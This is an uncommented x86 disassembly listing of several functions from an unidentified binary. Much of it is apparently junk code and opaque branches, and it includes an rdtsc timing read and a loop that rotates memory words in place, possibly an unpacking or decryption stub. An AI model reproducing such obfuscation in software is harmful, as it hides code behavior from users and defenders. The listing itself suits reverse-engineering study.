  41da9d:	cmp    eax,DWORD PTR ds:0x42b064
  41daa3:	je     0x41daad
  41daa5:	mov    edi,0xe741
  41daaa:	add    DWORD PTR [ebp-0x18],edi
  41daad:	mov    DWORD PTR [ebp-0x3c],eax
  41dab0:	call   0x41f2ed
  41dab5:	call   0x41ded2
  41daba:	mov    ecx,0x22ae
  41dabf:	add    ecx,ecx
  41dac1:	add    DWORD PTR [ebp-0x18],ecx
  41dac4:	mov    DWORD PTR [ebp-0x34],eax
  41dac7:	call   0x41ebd3
  41dacc:	mov    ebx,DWORD PTR [ebp-0x3c]
  41dacf:	push   0xffffffb8
  41dad1:	push   ebx
  41dad2:	push   0xc6fc9600
  41dad7:	push   0x1e
  41dad9:	push   0x26760a00
  41dade:	call   0x41f2ed
  41dae3:	add    esp,0x14
  41dae6:	push   eax
  41dae7:	push   esi
  41dae8:	call   0x41fa1f
  41daed:	add    esp,0x8
  41daf0:	sub    ebx,DWORD PTR [ebp-0x20]
  41daf3:	push   0xcefe9c00
  41daf8:	push   0x86dbf700
  41dafd:	call   0x41ea3e
  41db02:	add    esp,0x8
  41db05:	push   0x2a
  41db07:	push   edi
  41db08:	push   edi
  41db09:	push   0x5e6f7000
  41db0e:	call   0x41ee25
  41db13:	add    esp,0x10
  41db16:	xor    ebx,0xbda57317
  41db1c:	push   0xac3aad00
  41db21:	push   ebx
  41db22:	push   0x2ac75500
  41db27:	call   0x41f075
  41db2c:	add    esp,0xc
  41db2f:	push   0x38
  41db31:	push   edi
  41db32:	push   eax
  41db33:	push   0x4c5afb00
  41db38:	push   0xfffffff6
  41db3a:	call   0x41ea3e
  41db3f:	add    esp,0x14
  41db42:	mov    edi,DWORD PTR [ebp-0x34]
  41db45:	and    DWORD PTR [ebp-0x18],edi
  41db48:	sub    edi,DWORD PTR [ebp-0x3c]
  41db4b:	cmp    edi,0x46
  41db4e:	jne    0x41db70
  41db50:	sub    eax,esi
  41db52:	mov    ecx,0xe3
  41db57:	push   0xdebb5200
  41db5c:	push   0x7e1b8900
  41db61:	push   ecx
  41db62:	push   0xf6f1c900
  41db67:	push   ebx
  41db68:	call   0x41eccc
  41db6d:	add    esp,0x14
  41db70:	push   0x7c
  41db72:	push   0x3c14a700
  41db77:	call   0x41f075
  41db7c:	add    esp,0x8
  41db7f:	xor    edi,0xbda57312
  41db85:	push   esi
  41db86:	push   0xa2ead300
  41db8b:	push   eax
  41db8c:	call   0x41ea3e
  41db91:	add    esp,0xc
  41db94:	cmp    ebx,edi
  41db96:	je     0x41ddb4
  41db9c:	push   0x3
  41db9e:	push   0x26b11900
  41dba3:	call   0x41f2ed
  41dba8:	add    esp,0x8
  41dbab:	push   0xac077c00
  41dbb0:	call   0x41f2ed
  41dbb5:	add    esp,0x4
  41dbb8:	push   0x42b064
  41dbbd:	call   DWORD PTR ds:0x429404
  41dbc3:	cmp    esi,DWORD PTR [ebp-0x8]
  41dbc6:	jne    0x41dbd0
  41dbc8:	mov    ecx,0x672e
  41dbcd:	sub    DWORD PTR [ebp-0x18],ecx
  41dbd0:	or     eax,eax
  41dbd2:	je     0x41ddb4
  41dbd8:	mov    edx,0xb5
  41dbdd:	add    edx,ebx
  41dbdf:	or     edx,ecx
  41dbe1:	mov    esi,DWORD PTR [ebp-0x18]
  41dbe4:	mov    DWORD PTR [ebp-0x18],ecx
  41dbe7:	cmp    esi,0xffffffaf
  41dbea:	jne    0x41dc29
  41dbec:	cmp    edx,DWORD PTR [ebp-0x18]
  41dbef:	jne    0x41dc29
  41dbf1:	cmp    esi,DWORD PTR ds:0x42b064
  41dbf7:	jne    0x41dc29
  41dbf9:	add    esi,eax
  41dbfb:	mov    ebx,edi
  41dbfd:	mov    ecx,DWORD PTR [ebp-0x18]
  41dc00:	add    DWORD PTR [ebp-0x18],ebx
  41dc03:	sub    ecx,ebx
  41dc05:	add    ecx,ebx
  41dc07:	cmp    ecx,DWORD PTR [ebp-0xc]
  41dc0a:	je     0x41dc29
  41dc0c:	add    DWORD PTR [ebp-0x18],eax
  41dc0f:	mov    ebx,DWORD PTR [ebp-0x18]
  41dc12:	sub    DWORD PTR [ebp-0x18],edx
  41dc15:	and    ecx,ebx
  41dc17:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41dc1a:	je     0x41dc29
  41dc1c:	cmp    esi,0x13
  41dc1f:	jne    0x41dc29
  41dc21:	sub    DWORD PTR [ebp-0x18],esi
  41dc24:	and    ecx,edi
  41dc26:	mov    DWORD PTR [ebp-0x18],ecx
  41dc29:	add    DWORD PTR [ebp-0x38],0x271456c3
  41dc30:	xor    edi,edi
  41dc32:	mov    esi,DWORD PTR [ebp-0x18]
  41dc35:	sub    esi,ebx
  41dc37:	sub    DWORD PTR [ebp-0x18],edi
  41dc3a:	cmp    esi,0x50f
  41dc40:	jne    0x41dc45
  41dc42:	sub    DWORD PTR [ebp-0x18],esi
  41dc45:	lea    edi,[eax+0xae0]
  41dc4b:	and    edx,eax
  41dc4d:	push   0x2a
  41dc4f:	push   eax
  41dc50:	push   0x265ba500
  41dc55:	push   0x3c5a3600
  41dc5a:	push   0xffffffd7
  41dc5c:	call   0x41ee25
  41dc61:	add    esp,0x14
  41dc64:	push   0x2b
  41dc66:	push   edx
  41dc67:	push   0x1c217000
  41dc6c:	push   0xffffffe3
  41dc6e:	push   0x3ab6c100
  41dc73:	call   0x41ea3e
  41dc78:	add    esp,0x14
  41dc7b:	inc    edi
  41dc7c:	mov    ebx,0xd0
  41dc81:	xor    ecx,ecx
  41dc83:	sub    DWORD PTR [ebp-0x18],eax
  41dc86:	sub    ebx,ecx
  41dc88:	add    ebx,ecx
  41dc8a:	sub    DWORD PTR [ebp-0x18],ebx
  41dc8d:	mov    esi,DWORD PTR [edi]
  41dc8f:	mov    ecx,edi
  41dc91:	sub    DWORD PTR [ebp-0x18],esi
  41dc94:	sub    ecx,esi
  41dc96:	mov    ebx,0xd8
  41dc9b:	sub    ebx,esi
  41dc9d:	sub    ebx,edi
  41dc9f:	add    ecx,esi
  41dca1:	xor    DWORD PTR [ebp-0x18],ecx
  41dca4:	add    ebx,ebx
  41dca6:	sub    DWORD PTR [ebp-0x18],ebx
  41dca9:	sub    esi,0x5b4005c6
  41dcaf:	cmp    edi,DWORD PTR ds:0x42b064
  41dcb5:	je     0x41dcbc
  41dcb7:	add    ecx,eax
  41dcb9:	sub    DWORD PTR [ebp-0x18],ecx
  41dcbc:	cmp    esi,0xf24b0bc3
  41dcc2:	jne    0x41dc4b
  41dcc4:	mov    ebx,DWORD PTR [ebp-0x18]
  41dcc7:	cmp    ebx,0xb77b
  41dccd:	jne    0x41dd34
  41dccf:	mov    esi,0xf1
  41dcd4:	add    esi,eax
  41dcd6:	cmp    ebx,DWORD PTR ds:0x42b064
  41dcdc:	jne    0x41dd34
  41dcde:	and    esi,ecx
  41dce0:	push   ecx
  41dce1:	push   0x1c7f6a00
  41dce6:	push   eax
  41dce7:	push   ebx
  41dce8:	call   0x41eccc
  41dced:	add    esp,0x10
  41dcf0:	push   eax
  41dcf1:	call   0x41ee25
  41dcf6:	add    esp,0x4
  41dcf9:	add    esi,edi
  41dcfb:	call   0x41f2ed
  41dd00:	push   0xfeb01c00
  41dd05:	call   0x41fb7d
  41dd0a:	add    esp,0x4
  41dd0d:	call   0x41fb7d
  41dd12:	cmp    esi,DWORD PTR [ebp-0x40]
  41dd15:	je     0x41dd34
  41dd17:	push   ebx
  41dd18:	push   0xffffff91
  41dd1a:	push   0x8aeec400
  41dd1f:	call   0x41f1c7
  41dd24:	add    esp,0xc
  41dd27:	call   0x41f075
  41dd2c:	call   0x41f075
  41dd31:	sub    DWORD PTR [ebp-0x18],esi
  41dd34:	mov    esi,DWORD PTR [edi+0x4]
  41dd37:	sub    edi,eax
  41dd39:	test   edi,0xcc
  41dd3f:	jne    0x41ddb1
  41dd41:	cmp    esi,0x13
  41dd44:	je     0x41ddb1
  41dd46:	and    edi,ebx
  41dd48:	push   0xffffff83
  41dd4a:	push   eax
  41dd4b:	call   0x41f1c7
  41dd50:	add    esp,0x8
  41dd53:	call   0x41f075
  41dd58:	mov    eax,DWORD PTR [ebp-0x18]
  41dd5b:	push   0xffffffac
  41dd5d:	push   0x76ab5700
  41dd62:	call   0x41f7ae
  41dd67:	add    esp,0x8
  41dd6a:	mov    ebx,0x58a1
  41dd6f:	push   eax
  41dd70:	push   0xffffffc5
  41dd72:	push   esi
  41dd73:	push   0x3edb6500
  41dd78:	call   0x41ebd3
  41dd7d:	add    esp,0x10
  41dd80:	push   0x16c01700
  41dd85:	call   0x41f7ae
  41dd8a:	add    esp,0x4
  41dd8d:	cmp    edi,ebx
  41dd8f:	je     0x41ddb1
  41dd91:	push   ebx
  41dd92:	push   ebx
  41dd93:	push   0xffffffd6
  41dd95:	push   esi
  41dd96:	call   0x41ef3e
  41dd9b:	add    esp,0x10
  41dd9e:	add    DWORD PTR [ebp-0x18],eax
  41dda1:	sub    edi,esi
  41dda3:	push   0xcc5b2e00
  41dda8:	push   edi
  41dda9:	call   0x41fa1f
  41ddae:	add    esp,0x8
  41ddb1:	sub    DWORD PTR [ebp-0x38],esi
  41ddb4:	push   ecx
  41ddb5:	push   esi
  41ddb6:	push   0x58
  41ddb8:	call   0x41f075
  41ddbd:	add    esp,0xc
  41ddc0:	push   ebx
  41ddc1:	push   0x7c1f2500
  41ddc6:	push   0x6
  41ddc8:	push   0x4
  41ddca:	call   0x41fb7d
  41ddcf:	add    esp,0x10
  41ddd2:	mov    esi,0x52
  41ddd7:	push   0x2677a400
  41dddc:	call   0x41eccc
  41dde1:	add    esp,0x4
  41dde4:	mov    ecx,DWORD PTR [ebp-0x18]
  41dde7:	push   ecx
  41dde8:	push   0x62
  41ddea:	push   0x2b
  41ddec:	push   0x53
  41ddee:	push   edi
  41ddef:	call   0x41f3d2
  41ddf4:	add    esp,0x14
  41ddf7:	push   0xffffffc6
  41ddf9:	push   0x6b
  41ddfb:	call   0x41fb7d
  41de00:	add    esp,0x8
  41de03:	or     esi,ebx
  41de05:	push   edi
  41de06:	push   eax
  41de07:	push   esi
  41de08:	push   ebx
  41de09:	push   0x1d
  41de0b:	call   0x41f2ed
  41de10:	add    esp,0x14
  41de13:	mov    ecx,DWORD PTR [ebp+0xc]
  41de16:	mov    eax,DWORD PTR [ebp-0x18]
  41de19:	add    DWORD PTR [ebp-0x18],ecx
  41de1c:	cmp    eax,0x48
  41de1f:	je     0x41de5a
  41de21:	mov    edi,DWORD PTR [ebp-0x18]
  41de24:	mov    esi,0xa6
  41de29:	cmp    edi,0x57
  41de2c:	jne    0x41de5a
  41de2e:	and    eax,esi
  41de30:	mov    edx,0xf0
  41de35:	mov    ebx,DWORD PTR [ebp-0x18]
  41de38:	sub    edi,ebx
  41de3a:	cmp    eax,DWORD PTR ds:0x42b064
  41de40:	je     0x41de5a
  41de42:	add    DWORD PTR [ebp-0x18],eax
  41de45:	sub    edi,esi
  41de47:	add    edi,ebx
  41de49:	or     edi,eax
  41de4b:	mov    ebx,DWORD PTR [ebp-0x18]
  41de4e:	sub    DWORD PTR [ebp-0x18],ebx
  41de51:	mov    DWORD PTR [ebp-0x18],edx
  41de54:	add    DWORD PTR [ebp-0x18],ebx
  41de57:	sub    DWORD PTR [ebp-0x18],edi
  41de5a:	mov    edx,DWORD PTR [ebp-0x38]
  41de5d:	and    ebx,edi
  41de5f:	and    DWORD PTR [ebp-0x18],ebx
  41de62:	mov    DWORD PTR [ecx+0x0],edx
  41de65:	call   0x41f3d2
  41de6a:	push   0x55
  41de6c:	push   ebx
  41de6d:	push   0x8aed8c00
  41de72:	push   0x40
  41de74:	call   0x41f2ed
  41de79:	add    esp,0x10
  41de7c:	push   0x7e57a500
  41de81:	push   eax
  41de82:	push   eax
  41de83:	call   0x41f1c7
  41de88:	add    esp,0xc
  41de8b:	push   0xffffffb4
  41de8d:	push   0x22fcad00
  41de92:	push   ebx
  41de93:	push   ebx
  41de94:	call   0x41ef3e
  41de99:	add    esp,0x10
  41de9c:	pop    edi
  41de9d:	and    DWORD PTR [ebp-0x18],edi
  41dea0:	pop    esi
  41dea1:	push   0x2c4bd800
  41dea6:	push   0xffffffba
  41dea8:	call   0x41f075
  41dead:	add    esp,0x8
  41deb0:	pop    ebx
  41deb1:	or     eax,esi
  41deb3:	mov    edx,DWORD PTR [ebp-0x18]
  41deb6:	mov    ecx,0x53
  41debb:	sub    edx,ecx
  41debd:	push   ecx
  41debe:	push   ebx
  41debf:	push   0xffffffdc
  41dec1:	call   0x41f3d2
  41dec6:	add    esp,0xc
  41dec9:	leave  
  41deca:	ret    0x8
  41decd:	int3   
  41dece:	int3   
  41decf:	int3   
  41ded0:	int3   
  41ded1:	int3   
  41ded2:	push   ebp
  41ded3:	mov    ebp,esp
  41ded5:	sub    esp,0x30
  41ded8:	push   0x6f
  41deda:	push   0x7c
  41dedc:	push   0xfffffffe
  41dede:	call   0x41ee25
  41dee3:	add    esp,0xc
  41dee6:	push   0x5e50d800
  41deeb:	call   0x41f7ae
  41def0:	add    esp,0x4
  41def3:	push   ebx
  41def4:	push   0xffffffbe
  41def6:	push   0xb2389400
  41defb:	push   0xb2162000
  41df00:	push   0x49
  41df02:	push   eax
  41df03:	call   0x41ea3e
  41df08:	add    esp,0x14
  41df0b:	push   esi
  41df0c:	push   eax
  41df0d:	push   0xd
  41df0f:	push   0x3a
  41df11:	call   0x41ebd3
  41df16:	add    esp,0xc
  41df19:	push   edi
  41df1a:	push   0x92322400
  41df1f:	push   0xffffffa8
  41df21:	push   0x3f
  41df23:	call   0x41eccc
  41df28:	add    esp,0xc
  41df2b:	push   0xc885500
  41df30:	push   0x863e2b00
  41df35:	push   eax
  41df36:	call   0x41f1c7
  41df3b:	add    esp,0xc
  41df3e:	call   0x41ea3e
  41df43:	push   eax
  41df44:	call   0x41ebd3
  41df49:	add    esp,0x4
  41df4c:	rdtsc  
  41df4e:	and    edx,eax
  41df50:	xor    edi,edi
  41df52:	mov    ebx,edi
  41df54:	sub    ebx,edi
  41df56:	mov    DWORD PTR [ebp-0x30],ebx
  41df59:	add    edx,eax
  41df5b:	or     edx,eax
  41df5d:	sub    DWORD PTR [ebp-0x30],edi
  41df60:	add    DWORD PTR [ebp-0x30],eax
  41df63:	add    ebx,eax
  41df65:	add    ebx,eax
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	and    edx,edi
  41df6c:	or     DWORD PTR [ebp-0x30],ebx
  41df6f:	add    DWORD PTR [ebp-0x30],edx
  41df72:	mov    ebx,DWORD PTR [ebp-0x30]
  41df75:	mov    ecx,DWORD PTR ds:0x42b05c
  41df7b:	add    DWORD PTR [ebp-0x30],ecx
  41df7e:	cmp    ebx,DWORD PTR [ebp-0xc]
  41df81:	jne    0x41dfb9
  41df83:	cmp    ebx,ecx
  41df85:	jne    0x41dfb9
  41df87:	mov    edi,0xac
  41df8c:	mov    esi,DWORD PTR [ebp-0x30]
  41df8f:	cmp    ebx,0xffffff80
  41df92:	jne    0x41dfb9
  41df94:	or     DWORD PTR [ebp-0x30],edi
  41df97:	sub    DWORD PTR [ebp-0x30],ecx
  41df9a:	cmp    ebx,0x66a21c01
  41dfa0:	jne    0x41dfb9
  41dfa2:	cmp    ebx,esi
  41dfa4:	jne    0x41dfb9
  41dfa6:	mov    edx,ecx
  41dfa8:	sub    edx,eax
  41dfaa:	or     DWORD PTR [ebp-0x30],edx
  41dfad:	sub    DWORD PTR [ebp-0x30],ebx
  41dfb0:	xor    edi,edi
  41dfb2:	sub    esi,edi
  41dfb4:	or     esi,ebx
  41dfb6:	add    DWORD PTR [ebp-0x30],esi
  41dfb9:	mov    edi,DWORD PTR [ebp-0x30]
  41dfbc:	sub    DWORD PTR [ebp-0x30],edi
  41dfbf:	pop    edi
  41dfc0:	add    esi,edx
  41dfc2:	test   edi,0xf8
  41dfc8:	je     0x41dfee
  41dfca:	test   edi,0x57
  41dfd0:	je     0x41dfee
  41dfd2:	mov    ecx,0x21080a0
  41dfd7:	add    DWORD PTR [ebp-0x30],edi
  41dfda:	or     DWORD PTR [ebp-0x30],edi
  41dfdd:	mov    edx,DWORD PTR [ebp-0x30]
  41dfe0:	add    esi,eax
  41dfe2:	and    ecx,ebx
  41dfe4:	sub    DWORD PTR [ebp-0x30],edx
  41dfe7:	add    ecx,esi
  41dfe9:	add    ecx,edx
  41dfeb:	add    DWORD PTR [ebp-0x30],ecx
  41dfee:	pop    esi
  41dfef:	mov    edx,DWORD PTR ds:0x42b05c
  41dff5:	mov    ebx,DWORD PTR [ebp-0x30]
  41dff8:	mov    DWORD PTR [ebp-0x30],ebx
  41dffb:	sub    DWORD PTR [ebp-0x30],eax
  41dffe:	test   edi,0x6
  41e004:	jne    0x41e11c
  41e00a:	cmp    esi,ebx
  41e00c:	je     0x41e034
  41e00e:	cmp    esi,DWORD PTR [ebp-0x14]
  41e011:	je     0x41e034
  41e013:	cmp    esi,0x48
  41e016:	jne    0x41e034
  41e018:	cmp    esi,0xffffffbb
  41e01b:	je     0x41e034
  41e01d:	add    ecx,ecx
  41e01f:	add    DWORD PTR [ebp-0x30],esi
  41e022:	cmp    ecx,0x302c
  41e028:	je     0x41e034
  41e02a:	sub    ecx,ebx
  41e02c:	cmp    ecx,DWORD PTR [ebp-0xc]
  41e02f:	jne    0x41e034
  41e031:	mov    DWORD PTR [ebp-0x2c],ecx
  41e034:	cmp    ecx,edi
  41e036:	jne    0x41e11c
  41e03c:	mov    ecx,0x34
  41e041:	or     DWORD PTR [ebp-0x30],ecx
  41e044:	mov    ebx,DWORD PTR ds:0x42b05c
  41e04a:	sub    DWORD PTR [ebp-0x30],edx
  41e04d:	add    edx,edx
  41e04f:	add    DWORD PTR [ebp-0x30],ebx
  41e052:	and    ecx,esi
  41e054:	add    DWORD PTR [ebp-0x30],edx
  41e057:	sub    ecx,edx
  41e059:	and    ecx,ebx
  41e05b:	cmp    ecx,0x4
  41e05e:	je     0x41e11c
  41e064:	cmp    ecx,0xffffff89
  41e067:	jne    0x41e11c
  41e06d:	mov    ebx,edx
  41e06f:	add    ebx,edx
  41e071:	cmp    ecx,DWORD PTR [ebp-0x28]
  41e074:	jne    0x41e11c
  41e07a:	sub    ebx,edi
  41e07c:	sub    DWORD PTR [ebp-0x30],ecx
  41e07f:	xor    ecx,ecx
  41e081:	add    DWORD PTR [ebp-0x30],edx
  41e084:	mov    edx,eax
  41e086:	sub    DWORD PTR [ebp-0x30],eax
  41e089:	or     ebx,eax
  41e08b:	add    DWORD PTR [ebp-0x30],ecx
  41e08e:	sub    edx,ebx
  41e090:	cmp    edx,DWORD PTR [ebp-0x18]
  41e093:	je     0x41e11c
  41e099:	cmp    edx,ecx
  41e09b:	jne    0x41e11c
  41e09d:	xor    ecx,ecx
  41e09f:	mov    ebx,DWORD PTR [ebp-0x30]
  41e0a2:	mov    DWORD PTR [ebp-0x1c],ebx
  41e0a5:	add    edx,ebx
  41e0a7:	sub    ecx,eax
  41e0a9:	add    edx,edx
  41e0ab:	cmp    edx,0x2351
  41e0b1:	je     0x41e11c
  41e0b3:	mov    ebx,DWORD PTR [ebp-0x30]
  41e0b6:	add    ecx,ebx
  41e0b8:	sub    DWORD PTR [ebp-0x1c],ecx
  41e0bb:	cmp    ecx,DWORD PTR [ebp-0xc]
  41e0be:	jne    0x41e11c
  41e0c0:	sub    edx,eax
  41e0c2:	mov    ebx,DWORD PTR ds:0x42b05c
  41e0c8:	test   edx,0xc
  41e0ce:	je     0x41e11c
  41e0d0:	sub    DWORD PTR [ebp-0x1c],edx
  41e0d3:	mov    edx,ebx
  41e0d5:	and    ebx,edx
  41e0d7:	and    ebx,edx
  41e0d9:	or     DWORD PTR [ebp-0x30],eax
  41e0dc:	mov    edx,DWORD PTR [ebp-0x1c]
  41e0df:	test   edx,0x3fb5
  41e0e5:	je     0x41e11c
  41e0e7:	sub    edx,eax
  41e0e9:	mov    ecx,DWORD PTR [ebp-0x30]
  41e0ec:	cmp    esi,DWORD PTR ds:0x42b05c
  41e0f2:	jne    0x41e11c
  41e0f4:	cmp    edx,DWORD PTR ds:0x42b05c
  41e0fa:	je     0x41e11c
  41e0fc:	cmp    ecx,0xa79e
  41e102:	je     0x41e11c
  41e104:	cmp    edx,esi
  41e106:	je     0x41e11c
  41e108:	or     ebx,esi
  41e10a:	add    ecx,ebx
  41e10c:	mov    ebx,0x27
  41e111:	xor    DWORD PTR [ebp-0x30],ecx
  41e114:	sub    DWORD PTR [ebp-0x30],edx
  41e117:	sub    ebx,esi
  41e119:	sub    DWORD PTR [ebp-0x30],ebx
  41e11c:	pop    ebx
  41e11d:	add    edx,ecx
  41e11f:	cmp    ebx,DWORD PTR [ebp-0x30]
  41e122:	je     0x41e137
  41e124:	sub    edx,edi
  41e126:	xor    ecx,ecx
  41e128:	and    DWORD PTR [ebp-0x30],ebx
  41e12b:	sub    DWORD PTR [ebp-0x30],edx
  41e12e:	mov    ecx,DWORD PTR ds:0x42b0c8
  41e134:	add    DWORD PTR [ebp-0x30],ecx
  41e137:	leave  
  41e138:	ret    
  41e139:	int3   
  41e13a:	int3   
  41e13b:	int3   
  41e13c:	int3   
  41e13d:	int3   
  41e13e:	push   ebp
  41e13f:	mov    ebp,esp
  41e141:	sub    esp,0x34
  41e144:	push   0x53
  41e146:	push   0xbe587800
  41e14b:	push   0x26fa9e00
  41e150:	push   0xe
  41e152:	call   0x41f3d2
  41e157:	add    esp,0x10
  41e15a:	call   0x41f7ae
  41e15f:	push   ebx
  41e160:	call   0x41f2ed
  41e165:	push   0x6d
  41e167:	push   0x4c
  41e169:	call   0x41ea3e
  41e16e:	add    esp,0x8
  41e171:	push   esi
  41e172:	push   0x1e627500
  41e177:	push   0x64
  41e179:	push   0x2cf61c00
  41e17e:	push   0x36
  41e180:	push   0x11
  41e182:	call   0x41f075
  41e187:	add    esp,0x14
  41e18a:	call   0x41fb7d
  41e18f:	push   edi
  41e190:	cmp    eax,DWORD PTR [ebp-0x28]
  41e193:	jne    0x41e198
  41e195:	mov    DWORD PTR [ebp-0x8],eax
  41e198:	push   0x7ee52700
  41e19d:	push   eax
  41e19e:	call   0x41f7ae
  41e1a3:	add    esp,0x8
  41e1a6:	call   0x41f075
  41e1ab:	mov    eax,DWORD PTR [ebp+0x10]
  41e1ae:	cmp    eax,0xffffffa8
  41e1b1:	je     0x41e1c0
  41e1b3:	cmp    eax,DWORD PTR [ebp-0x34]
  41e1b6:	je     0x41e1c0
  41e1b8:	cmp    eax,0x16
  41e1bb:	jne    0x41e1c0
  41e1bd:	mov    DWORD PTR [ebp-0x24],eax
  41e1c0:	mov    ecx,DWORD PTR [ebp+0x8]
  41e1c3:	mov    DWORD PTR [ebp-0x2c],ecx
  41e1c6:	cmp    DWORD PTR [ebp+0xc],eax
  41e1c9:	je     0x41e344
  41e1cf:	mov    esi,eax
  41e1d1:	add    DWORD PTR [ebp-0x2c],esi
  41e1d4:	dec    DWORD PTR [ebp+0xc]
  41e1d7:	cmp    ecx,eax
  41e1d9:	je     0x41e1ff
  41e1db:	mov    edi,0x6002e2c
  41e1e0:	and    edi,ecx
  41e1e2:	mov    esi,DWORD PTR [ebp-0x2c]
  41e1e5:	cmp    edi,0x26
  41e1e8:	je     0x41e1ff
  41e1ea:	and    esi,edi
  41e1ec:	xor    edi,edi
  41e1ee:	sub    DWORD PTR [ebp-0x2c],esi
  41e1f1:	mov    esi,DWORD PTR [ebp-0x2c]
  41e1f4:	add    DWORD PTR [ebp-0x2c],edi
  41e1f7:	cmp    esi,DWORD PTR [ebp-0x34]
  41e1fa:	jne    0x41e1ff
  41e1fc:	add    DWORD PTR [ebp-0x2c],esi
  41e1ff:	add    DWORD PTR [ecx],eax
  41e201:	mov    ebx,DWORD PTR [ebp-0x2c]
  41e204:	xor    edx,edx
  41e206:	cmp    esi,0xffffff9c
  41e209:	je     0x41e26a
  41e20b:	add    DWORD PTR [ebp-0x2c],edx
  41e20e:	sub    ebx,edx
  41e210:	mov    esi,edi
  41e212:	mov    edx,edi
  41e214:	sub    esi,eax
  41e216:	add    DWORD PTR [ebp-0x2c],edx
  41e219:	sub    ebx,eax
  41e21b:	or     ebx,edi
  41e21d:	cmp    ecx,0xffffffec
  41e220:	je     0x41e26a
  41e222:	mov    edi,DWORD PTR [ebp-0x2c]
  41e225:	sub    DWORD PTR [ebp-0x2c],edi
  41e228:	add    ebx,edi
  41e22a:	sub    ebx,ecx
  41e22c:	cmp    esi,0x51
  41e22f:	jne    0x41e26a
  41e231:	and    ebx,esi
  41e233:	mov    edi,DWORD PTR [ebp-0x2c]
  41e236:	add    edi,ebx
  41e238:	and    DWORD PTR [ebp-0x2c],edx
  41e23b:	mov    ebx,eax
  41e23d:	add    edi,ebx
  41e23f:	cmp    edi,DWORD PTR [ebp-0x24]
  41e242:	jne    0x41e26a
  41e244:	add    edi,eax
  41e246:	add    DWORD PTR [ebp-0x2c],ecx
  41e249:	add    edi,eax
  41e24b:	add    edi,edx
  41e24d:	cmp    edi,0xd503
  41e253:	jne    0x41e26a
  41e255:	xor    ebx,ebx
  41e257:	mov    esi,DWORD PTR ds:0x42b084
  41e25d:	add    DWORD PTR [ebp-0x2c],edi
  41e260:	sub    ebx,esi
  41e262:	sub    DWORD PTR [ebp-0x2c],edi
  41e265:	sub    ebx,eax
  41e267:	sub    DWORD PTR [ebp-0x2c],ebx
  41e26a:	rol    DWORD PTR [ecx],0x0
  41e26d:	mov    edx,DWORD PTR [ebp-0x2c]
  41e270:	cmp    edx,0xfd31
  41e276:	je     0x41e2d6
  41e278:	mov    esi,DWORD PTR [ebp-0x2c]
  41e27b:	xor    ebx,ebx
  41e27d:	cmp    edx,0x2ae1
  41e283:	jne    0x41e2d6
  41e285:	xor    DWORD PTR [ebp-0x2c],edx
  41e288:	mov    edx,0xec
  41e28d:	cmp    esi,DWORD PTR ds:0x42b084
  41e293:	jne    0x41e2d6
  41e295:	or     ebx,esi
  41e297:	cmp    ebx,DWORD PTR [ebp-0x1c]
  41e29a:	jne    0x41e2d6
  41e29c:	xor    esi,esi
  41e29e:	add    edx,eax
  41e2a0:	add    DWORD PTR [ebp-0x2c],esi
  41e2a3:	mov    esi,DWORD PTR [ebp-0x2c]
  41e2a6:	cmp    edx,esi
  41e2a8:	jne    0x41e2d6
  41e2aa:	add    DWORD PTR [ebp-0x2c],edx
  41e2ad:	sub    esi,eax
  41e2af:	mov    edx,DWORD PTR [ebp-0x2c]
  41e2b2:	or     DWORD PTR [ebp-0x2c],ebx
  41e2b5:	cmp    edx,0x71
  41e2b8:	jne    0x41e2d6
  41e2ba:	mov    ebx,DWORD PTR [ebp-0x2c]
  41e2bd:	sub    esi,edx
  41e2bf:	mov    edx,0xe5
  41e2c4:	xor    DWORD PTR [ebp-0x2c],ebx
  41e2c7:	sub    DWORD PTR [ebp-0x2c],edx
  41e2ca:	and    esi,ecx
  41e2cc:	sub    esi,edx
  41e2ce:	add    DWORD PTR [ebp-0x2c],edx
  41e2d1:	and    esi,eax
  41e2d3:	add    DWORD PTR [ebp-0x2c],esi
  41e2d6:	rol    DWORD PTR [ecx],0x9
  41e2d9:	cmp    eax,0x896f
  41e2de:	jne    0x41e2e8
  41e2e0:	mov    ebx,DWORD PTR [ebp-0x2c]
  41e2e3:	and    ebx,eax
  41e2e5:	sub    DWORD PTR [ebp-0x2c],ebx
  41e2e8:	rol    DWORD PTR [ecx],0x1f
  41e2eb:	mov    esi,ecx
  41e2ed:	add    DWORD PTR [ebp-0x2c],esi
  41e2f0:	add    ecx,0x4
  41e2f3:	cmp    ecx,ebx
  41e2f5:	jne    0x41e33f
  41e2f7:	cmp    ecx,esi
  41e2f9:	je     0x41e33f
  41e2fb:	mov    esi,0x2d7a
  41e300:	mov    edx,DWORD PTR ds:0x42b094
  41e306:	sub    edx,edi
  41e308:	add    DWORD PTR [ebp-0x2c],ecx
  41e30b:	add    DWORD PTR [ebp-0x2c],esi
  41e30e:	cmp    edx,DWORD PTR ds:0x42b084
  41e314:	jne    0x41e33f
  41e316:	mov    esi,0x8d
  41e31b:	mov    ebx,0xad
  41e320:	cmp    edx,0x25
  41e323:	jne    0x41e33f
  41e325:	and    edx,eax
  41e327:	add    ebx,ebx
  41e329:	xor    DWORD PTR [ebp-0x2c],esi
  41e32c:	mov    esi,DWORD PTR [ebp-0x2c]
  41e32f:	add    DWORD PTR [ebp-0x2c],ebx
  41e332:	add    esi,esi
  41e334:	sub    edx,ecx
  41e336:	sub    edx,esi
  41e338:	cmp    edx,esi
  41e33a:	jne    0x41e33f
  41e33c:	or     DWORD PTR [ebp-0x2c],edx
  41e33f:	jmp    0x41e1c3
  41e344:	call   0x41ebd3
  41e349:	sub    DWORD PTR [ebp-0x2c],eax
  41e34c:	call   0x41ee25
  41e351:	push   0x45
  41e353:	push   0x4a
  41e355:	push   eax
  41e356:	push   0x5b
  41e358:	call   0x41ea3e
  41e35d:	add    esp,0x10
  41e360:	pop    edi
  41e361:	or     DWORD PTR [ebp-0x2c],edi
  41e364:	pop    esi
  41e365:	call   0x41f3d2
  41e36a:	push   eax
  41e36b:	push   0x1c
  41e36d:	push   0xffffffdb
  41e36f:	call   0x41f2ed
  41e374:	add    esp,0xc
  41e377:	pop    ebx
  41e378:	push   0xe26bf900
  41e37d:	push   edi
  41e37e:	push   0x26fd6b00
  41e383:	call   0x41eccc
  41e388:	add    esp,0xc
  41e38b:	leave  
  41e38c:	ret    0xc
  41e38f:	int3   
  41e390:	int3   
  41e391:	int3   
  41e392:	int3   
  41e393:	int3   
  41e394:	push   ebp
  41e395:	mov    ebp,esp
  41e397:	sub    esp,0x38
  41e39a:	call   0x41f3d2
  41e39f:	push   ebx
  41e3a0:	call   0x41fb7d
